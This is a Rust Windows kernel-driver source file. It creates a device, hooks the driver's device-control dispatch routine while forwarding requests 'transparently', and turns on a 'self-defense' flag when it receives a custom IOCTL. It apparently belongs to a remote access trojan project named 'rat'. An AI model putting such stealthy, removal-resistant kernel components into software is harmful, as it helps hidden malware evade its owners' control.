use core::sync::atomic::{AtomicPtr, Ordering};
use core::{mem, ptr};

use rat_common::windows::IOCTL_START_DEFENSE;
use wdk::nt_success;
use wdk_sys::ntddk::{IoCreateDevice, IoCreateSymbolicLink, RtlInitUnicodeString};
use wdk_sys::{
    DEVICE_OBJECT, DO_BUFFERED_IO, DO_DEVICE_INITIALIZING, FILE_DEVICE_SECURE_OPEN,
    FILE_DEVICE_UNKNOWN, IO_STACK_LOCATION, IRP, IRP_MJ_DEVICE_CONTROL, NTSTATUS, PDEVICE_OBJECT,
    PDRIVER_OBJECT, PIRP, STATUS_UNSUCCESSFUL, UNICODE_STRING,
};

use crate::global::{DEVICE_NAME, DOS_NAME, SELF_DEFENSE_ACTIVATED};
use crate::info;
use crate::wrappers::bindings::IoGetCurrentIrpStackLocation;

type IrpHandler = unsafe extern "C" fn(PDEVICE_OBJECT, PIRP) -> NTSTATUS;

static _OLD_DEVICE_CONTROL_HANDLER: AtomicPtr<u8> = AtomicPtr::new(ptr::null_mut());

pub fn create_device(driver: PDRIVER_OBJECT) -> anyhow::Result<PDEVICE_OBJECT> {
    let mut dos_name = UNICODE_STRING::default();
    let mut device_name = UNICODE_STRING::default();
    unsafe {
        RtlInitUnicodeString(&mut dos_name, DOS_NAME.as_ptr());
        RtlInitUnicodeString(&mut device_name, DEVICE_NAME.as_ptr());
    }

    let mut device = ptr::null_mut();
    let status = unsafe {
        IoCreateDevice(
            driver,
            0,
            &mut device_name,
            FILE_DEVICE_UNKNOWN,
            FILE_DEVICE_SECURE_OPEN,
            0,
            &mut device,
        )
    };

    anyhow::ensure!(nt_success(status), "IoCreateDevice error: 0x{status:X}");

    if let Some(device) = unsafe { device.as_mut() } {
        device.Flags |= DO_BUFFERED_IO;
        device.Flags &= !DO_DEVICE_INITIALIZING;
    }

    match unsafe { driver.as_mut() } {
        Some(driver) => {
            if let Some(handler) = driver.MajorFunction[IRP_MJ_DEVICE_CONTROL as usize] {
                _OLD_DEVICE_CONTROL_HANDLER.store(handler as *mut u8, Ordering::Release);
            }

            driver.MajorFunction[IRP_MJ_DEVICE_CONTROL as usize] = Some(device_control_handler);
        }
        None => {
            anyhow::bail!("A null pointer is provided to create_device");
        }
    }

    let status = unsafe { IoCreateSymbolicLink(&mut dos_name, &mut device_name) };
    anyhow::ensure!(
        nt_success(status),
        "IoCreateSymbolicLink error: 0x{status:X}",
    );

    Ok(device)
}

unsafe extern "C" fn device_control_handler(device: PDEVICE_OBJECT, irp: PIRP) -> NTSTATUS {
    // Handle our custom IOCTLs here. Stay as transparent as possible.
    if let Some(device) = unsafe { device.as_ref() }
        && let Some(irp) = unsafe { irp.as_mut() }
        && let Some(irpsp) = unsafe { IoGetCurrentIrpStackLocation(irp).as_ref() }
    {
        device_control_notify(device, irp, irpsp);
    }

    let old_handler = _OLD_DEVICE_CONTROL_HANDLER.load(Ordering::Acquire);
    if old_handler.is_null() {
        return STATUS_UNSUCCESSFUL;
    }

    unsafe {
        let handler = mem::transmute::<*mut u8, IrpHandler>(old_handler);
        handler(device, irp)
    }
}

fn device_control_notify(_: &DEVICE_OBJECT, _: &IRP, irpsp: &IO_STACK_LOCATION) {
    match unsafe { irpsp.Parameters.DeviceIoControl.IoControlCode } {
        IOCTL_START_DEFENSE => {
            info!("Activating self-defense");
            SELF_DEFENSE_ACTIVATED.store(true, Ordering::Release);
        }
        _ => {
            // pass
        }
    }
}
